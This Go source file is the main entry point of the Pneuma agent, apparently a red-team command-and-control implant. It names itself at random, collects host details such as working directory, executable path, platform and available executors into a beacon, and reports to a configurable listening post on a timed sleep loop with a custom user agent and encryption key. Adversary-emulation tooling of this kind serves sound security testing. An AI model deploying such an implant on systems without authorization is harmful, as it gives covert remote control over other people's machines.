package main

import (
	"flag"
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	"log"
	"math/rand"
	"os"
	"runtime"
	"strings"
	"time"
)

var key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"

func pickName(chars int) string {
	rand.Seed(time.Now().UnixNano())
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, chars)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func buildBeacon(name string, group string) sockets.Beacon {
	pwd, _ := os.Getwd()
	executable, _ := os.Executable()
	return sockets.Beacon{
		Name:      name,
		Range:     group,
		Pwd:       pwd,
		Location:  executable,
		Platform:  runtime.GOOS,
		Executors: util.DetermineExecutors(runtime.GOOS, runtime.GOARCH),
		Links:     make([]sockets.Instruction, 0),
	}
}

func main() {
	config := util.BuildConfig()
	util.ExecutionRestraints(config)

	name := flag.String("name", pickName(12), "Give this agent a name")
	contact := flag.String("contact", config.Agent.Contact, "Which contact to use")
	address := flag.String("address", config.Agent.Address, "The ip:port of the socket listening post")
	group := flag.String("range", config.Agent.Range, "Which range to associate to")
	sleep := flag.Int("sleep", config.Agent.Sleep, "Number of seconds to sleep between beacons")
	useragent := flag.String("useragent", config.Agent.Useragent, "User agent used when connecting")
	flag.Parse()

	sockets.UA = *useragent
	util.EncryptionKey = []byte(config.Agent.AESKey)
	if !strings.Contains(*address, ":") {
		log.Println("Your address is incorrect")
		os.Exit(1)
	}
	log.Printf("[%s] agent at PID %d using key %s", *contact, os.Getpid(), key)
	sockets.CommunicationChannels[*contact].Communicate(*address, *sleep, buildBeacon(*name, *group))
}
